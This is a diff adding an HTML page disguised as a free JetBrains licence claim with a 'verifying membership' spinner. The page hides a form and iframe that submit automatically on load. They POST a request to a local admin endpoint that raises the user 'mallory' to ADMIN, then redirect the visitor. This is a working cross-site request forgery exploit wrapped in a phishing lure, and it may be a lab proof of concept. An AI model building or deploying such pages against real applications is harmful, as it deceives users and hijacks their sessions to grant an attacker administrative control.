@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Claim your JetBrains licence · DevForge Perks</title>
+<style>
+  body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+         background: #f6f8fa; color: #24292f; display: flex; min-height: 100vh;
+         align-items: center; justify-content: center; margin: 0; }
+  .box { background: #fff; border: 1px solid #d0d7de; border-radius: 12px;
+         padding: 36px 40px; max-width: 440px; text-align: center;
+         box-shadow: 0 8px 24px rgba(0,0,0,.08); }
+  h1 { font-size: 22px; margin: 0 0 10px; }
+  p { color: #57606a; font-size: 14px; }
+  .spin { margin: 20px auto; width: 34px; height: 34px; border: 4px solid #d0d7de;
+          border-top-color: #2f81f7; border-radius: 50%; animation: s 1s linear infinite; }
+  @keyframes s { to { transform: rotate(360deg); } }
+  .tag { font-size: 12px; color: #8b949e; margin-top: 18px; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <h1>Verifying your team membership…</h1>
+    <p>Hang tight while we confirm your DevForge account and reserve your free JetBrains licence.</p>
+    <div class="spin"></div>
+    <div class="tag">devforge-perks.example</div>
+  </div>
+
+  <iframe name="sink" style="display:none"></iframe>
+  <form id="f" action="http://localhost:8080/api/admin/update-role" method="POST" target="sink">
+    <input type="hidden" name="username" value="mallory">
+    <input type="hidden" name="role" value="ADMIN">
+  </form>
+
+  <script>
+    document.getElementById('f').submit();
+    setTimeout(function () { window.location = 'http://localhost:3000'; }, 1500);
+  </script>
+</body>
+</html>
